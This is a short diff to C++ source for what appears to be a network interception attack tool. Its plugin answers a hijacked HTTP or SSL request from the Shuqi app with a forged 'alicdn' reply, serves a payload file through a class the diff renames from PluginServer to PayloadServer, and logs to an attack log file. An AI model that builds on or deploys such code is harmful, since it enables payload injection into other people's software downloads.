@@ -1,12 +1,12 @@
 
 #include <windows.h>
 #include "ShuqiPlugin.h"
-#include "PluginServer.h"
+#include "PayloadServer.h"
 #include "../attacker.h"
 #include <stdio.h>
 #include "../cipher/CryptoUtils.h"
 #include "../cipher/Base64.h"
-#include "PluginServer.h"
+#include "PayloadServer.h"
 #include "../Public.h"
 #include "../attack.h"
 #include "../HttpUtils.h"
@@ -156,7 +156,7 @@ int ShuqiPlugin::makeShuqiRequestReply(char * dstbuf, int dstbuflimit, LPSSLPROX
 	int outlen = sprintf_s(szout, 4096, "alicdn reply:%s\r\n", hdrformat);
 	Public::writeFile(ATTACK_LOG_FILENAME, szout, outlen);
 
-	ret = PluginServer::SendPluginFile(urlfilename.c_str(), lpssl, hdrformat, 1);
+	ret = PayloadServer::SendPluginFile(urlfilename.c_str(), lpssl, hdrformat, 1);
 
 	return httphdrlen;
 }
@@ -297,7 +297,7 @@ int ShuqiPlugin::makeShuqiRequestReply(char * dstbuf, int dstbuflimit, LPHTTPPRO
 	int outlen = sprintf_s(szout, 4096, "alicdn reply:%s\r\n", hdrformat);
 	Public::writeFile(ATTACK_LOG_FILENAME, szout, outlen);
 
-	ret = PluginServer::SendPluginFile(urlfilename.c_str(), lphttp, hdrformat, 1);
+	ret = PayloadServer::SendPluginFile(urlfilename.c_str(), lphttp, hdrformat, 1);
 
 	return httphdrlen;
 }
